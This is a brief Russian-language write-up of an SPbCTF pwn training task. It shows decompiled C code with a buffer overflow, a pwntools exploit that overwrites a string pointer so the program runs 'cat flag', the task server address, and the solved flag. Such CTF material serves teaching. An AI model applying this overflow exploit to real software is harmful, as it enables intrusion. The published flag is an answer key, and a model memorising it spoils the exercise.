[Tasks :: pwn.spbctf.ru](https://pwn.spbctf.ru/tasks/pwn2_mc0)
Описание:
Найдите указатель на строчку и перетрите его
`nc 109.233.56.90 11600`
**[sptr](https://pwn.spbctf.ru/files/canary/sptr)**

Надо просто перетереть ссылку с "NO WIN" (unk_402008) на "WIN"
``` c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char buf[8]; // [rsp+0h] [rbp-10h] BYREF
  char *string_pointer; // [rsp+8h] [rbp-8h]

  string_pointer = (char *)&unk_402008;
  puts("let's overwrite a pointer to C string!");
  printf("before read: %p\n", &unk_402008);
  read(0, buf, 0x20u);
  printf("after read: %p\n", string_pointer);

  if ( !strcmp(string_pointer, "WIN") )
    system("cat flag");
  return 0;
}
```

Эксплоит:
``` python
io = start()

io.recvline()
io.recvline()
payload = b'A' * 8 + p64(0x40200B)
io.sendline(payload)

io.interactive()
```

Запуск:
![{7C0DB1AD-83C9-4B96-822C-816DA160E999}](../../../../z.%20Images/{7C0DB1AD-83C9-4B96-822C-816DA160E999}.png)

Ответ: `spbctf{b0e0b0cedc622b2396e0069cd5a5f568}`